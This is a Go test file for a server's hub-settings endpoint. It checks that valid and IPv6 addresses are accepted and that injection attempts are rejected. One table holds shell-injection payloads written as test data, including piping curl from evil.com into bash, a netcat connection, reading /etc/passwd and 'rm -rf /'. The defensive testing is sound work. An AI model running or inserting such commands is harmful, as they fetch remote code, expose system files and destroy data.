package server

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestUpdateHubConfig_ValidAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"myhost.example.com:9443"}`)
	req := httptest.NewRequest("PUT", "/api/settings/hub", body)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_EmptyAddress(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":""}`)
	req := httptest.NewRequest("PUT", "/api/settings/hub", body)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for empty address (reset), got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestUpdateHubConfig_ShellInjection(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	tests := []struct {
		name string
		addr string
	}{
		{"semicolon", "; curl evil.com | bash #"},
		{"backtick", "`whoami`"},
		{"dollar", "$(cat /etc/passwd)"},
		{"pipe", "host | nc evil 4444"},
		{"ampersand", "host & rm -rf /"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := bytes.NewBufferString(`{"grpc_external_addr":"` + tt.addr + `"}`)
			req := httptest.NewRequest("PUT", "/api/settings/hub", body)
			req.Header.Set("Authorization", "Bearer "+token)
			rec := httptest.NewRecorder()
			s.routes().ServeHTTP(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for injection attempt %q, got %d: %s", tt.addr, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestUpdateHubConfig_IPv6Address(t *testing.T) {
	s := testServer(t)
	token := registerAndGetAdminToken(t, s)

	body := bytes.NewBufferString(`{"grpc_external_addr":"[::1]:9443"}`)
	req := httptest.NewRequest("PUT", "/api/settings/hub", body)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	s.routes().ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for IPv6 address, got %d: %s", rec.Code, rec.Body.String())
	}
}
